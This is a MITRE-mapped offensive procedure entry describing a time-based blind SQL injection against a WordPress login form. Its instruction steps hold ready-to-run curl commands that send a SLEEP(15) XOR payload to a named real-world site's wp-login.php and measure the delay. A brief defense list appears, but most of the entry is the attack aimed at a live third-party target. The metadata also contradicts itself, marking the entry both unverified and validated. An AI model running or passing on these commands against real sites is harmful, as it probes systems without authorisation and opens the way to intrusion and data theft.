---
id: proc-inject-blind-sqli-001
tags:
  - sqli
  - blind-sqli
  - time-based
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-inject-sleep-15]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:09.896Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject Time-Based Blind SQLi Payload into Log

## Summary

This procedure injects a time-based blind SQL injection payload into the 'log' parameter of the WordPress login form to detect vulnerability through response delays, confirming arbitrary SQL execution without visible errors.

## Description

Time-based blind SQLi exploits unescaped inputs in SQL queries by using functions like SLEEP() to delay responses conditionally. In MySQL (common in WordPress), payloads like '0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z' close strings and inject delays if vulnerable. This targets authentication bypass and data exfiltration potential.

## Requirements

1. Confirmed login endpoint from prior recon
2. Curl or similar for timed requests
3. Ability to measure response times accurately

## Defense

Defensive measures and detection strategies:

- Parameterize all database queries with PDO or mysqli_prepare
- Rate-limit login attempts and monitor for unusual delays
- Log and alert on SQL keywords in inputs (e.g., XOR, SLEEP)

## Objectives

1. Induce a detectable delay in vulnerable queries
2. Confirm injection without data leakage
3. Assess MySQL version compatibility via now()=sysdate()

## Instructions

### Step 1: Craft and Send Payload

**Context**: Inject the payload into 'log' to test for delay in the authentication query.

**Command** ([[commands/curl-inject-sleep-15]]):
```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

> The XOR balances the query; sleep(15) delays if injected. Expect ~20s total time.

### Step 2: Validate Delay

**Context**: Compare against baseline; significant increase indicates success.

**Command** ([[commands/curl-inject-sleep-15]] with silent):
```bash
curl -s -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

> No output body needed; focus on timing.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-sleep-15]]

## Tools Used


## Tags

- sqli
- blind-sqli
- time-based

